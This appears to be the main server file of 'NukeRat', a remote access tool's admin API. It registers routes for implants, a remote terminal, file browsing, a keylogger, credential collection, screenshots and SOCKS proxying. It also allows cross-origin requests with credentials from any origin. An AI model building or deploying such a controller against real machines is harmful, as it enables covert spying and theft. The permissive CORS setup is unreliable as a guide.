try:
    print("Loading dependencies ...", end="", flush=True)
    from fastapi import FastAPI
    import asyncio
    from contextlib import asynccontextmanager
    from fastapi.responses import ORJSONResponse
    from fastapi.exceptions import RequestValidationError
    from starlette.exceptions import HTTPException as StarletteHTTPException
    from fastapi.middleware.cors import CORSMiddleware
    from routes import terminal as _terminal_
    from routes import listeners as _listeners_
    from routes import sessions as _sessions_
    from routes import explorer as _explorer_
    from routes import process as _process_
    from routes import auth as _auth_
    from routes import implants as _implants_
    from routes import logs as _logs_
    from routes import file_server as _file_server_
    from routes import agents as _agents_
    from routes import credentials as _credentials_
    from routes import keylogger as _keylogger_
    from routes import queue as _queue_
    from routes import iocs as _iocs_
    from routes import scripts as _scripts_
    from routes import notifications as _notifications_
    from routes import screenshot as _screenshot_
    from routes import network as _network_
    from routes import ns_output as _ns_output_
    from routes import reports as _reports_
    from routes import aes as _aes_
    from infra.database.database import sqlite_db
    from infra.listeners.http.manage import http_listener
    from infra.listeners.file_server.manage import file_server_listener
    from infra.listeners.port_forward.manage import port_forward_listener
    from infra.listeners.socks.manage import socks_listener
    from infra.listeners.socks.queue_bridge import get_bridge
    from infra.general.create_log import global_exception_handler, setup_logging, logger as app_logger, clip_log
    from schemas.__exception__ import validation_exception_handler
    from middlewares.jwt import jwt_middleware
    from utils.nukescripts.core import start_worker
    print(" done")

except Exception as e:
    print(f"\n[ \x1b[38;2;255;48;48mERROR\x1b[0m ] Failed to load dependencies")
    print(f"[ \x1b[38;2;255;48;48mERROR\x1b[0m ] {e}")
    exit(1)

setup_logging()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Starts the database, restores listeners and boots the nukescript worker
    try:
        print("Starting SQLite database ...", end="", flush=True)
        await sqlite_db.start()
        print(" done")
    except Exception as e:
        print()
        print(f"\n[ \x1b[38;2;255;48;48mERROR\x1b[0m ] Unable to start sqlite database")
        print(f"[ \x1b[38;2;255;48;48mERROR\x1b[0m ] {e}")
        exit(1)
    for label, setup in (
        ("http", http_listener.setup),
        ("file_server", file_server_listener.setup),
        ("socks", socks_listener.setup),
        ("port_forward", port_forward_listener.setup),
    ):
        try:
            await setup()
        except Exception as e:
            print(f"[ \x1b[38;2;255;48;48mERROR\x1b[0m ] Unable to restore {label} listeners from database | {e}")
            

    get_bridge().main_loop = asyncio.get_running_loop()
    try:
        print("Starting NukeScripts worker ...", end="", flush=True)
        worker_ready, worker_state = start_worker()
        if not await asyncio.to_thread(worker_ready.wait, 30.0):
            print()
            print(f"\n[ \x1b[38;2;255;48;48mERROR\x1b[0m ] Unable to start NukeScripts worker")
            print(f"[ \x1b[38;2;255;48;48mERROR\x1b[0m ] worker did not become ready in time")
            exit(1)
        if worker_state.get("error"):
            raise worker_state["error"]
        print(" done")
    except Exception as e:
        print()
        print(f"\n[ \x1b[38;2;255;48;48mERROR\x1b[0m ] Unable to start NukeScripts worker")
        print(f"[ \x1b[38;2;255;48;48mERROR\x1b[0m ] {e}")
        exit(1)

    from launcher.utils.config import config as app_config

    srv = app_config["config"]
    scheme = srv.get("protocol", "http")
    host, port = srv["host"], srv["port"]
    print(f"[ \x1b[38;2;0;238;0mOK\x1b[0m ] Server is running on {host}:{port} ({scheme}://{host}:{port})")
    yield


app = FastAPI(
    lifespan=lifespan,
    title="NukeRat Admin API",
    default_response_class=ORJSONResponse,
)

app.add_exception_handler(RequestValidationError, validation_exception_handler)
app.add_exception_handler(Exception, global_exception_handler)

app.middleware("http")(jwt_middleware)
app.add_middleware(
    CORSMiddleware,
    allow_origin_regex="https?://.*",
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(_auth_.router, prefix="/auth")
app.include_router(_terminal_.router, prefix="/api/terminal")
app.include_router(_listeners_.router, prefix="/api/listeners", tags=["keys"])
app.include_router(_sessions_.router, prefix="/api/sessions")
app.include_router(_explorer_.router, prefix="/api/explorer")
app.include_router(_process_.router, prefix="/api/process")
app.include_router(_implants_.router, prefix="/api/implants")
app.include_router(_logs_.router, prefix="/api/logs")
app.include_router(_file_server_.router, prefix="/api/file_server")
app.include_router(_agents_.router, prefix="/api/agents")
app.include_router(_credentials_.router, prefix="/api/credentials")
app.include_router(_keylogger_.router, prefix="/api/keylogger")
app.include_router(_queue_.router, prefix="/api/queue")
app.include_router(_iocs_.router, prefix="/api/iocs")
app.include_router(_scripts_.router, prefix="/api/scripts")
app.include_router(_notifications_.router, prefix="/api/notifications")
app.include_router(_screenshot_.router, prefix="/api/screenshot")
app.include_router(_network_.router, prefix="/api/network")
app.include_router(_ns_output_.router, prefix="/api/nsoutput")
app.include_router(_reports_.router, prefix="/api/reports")
app.include_router(_aes_.router, prefix="/api/aes")
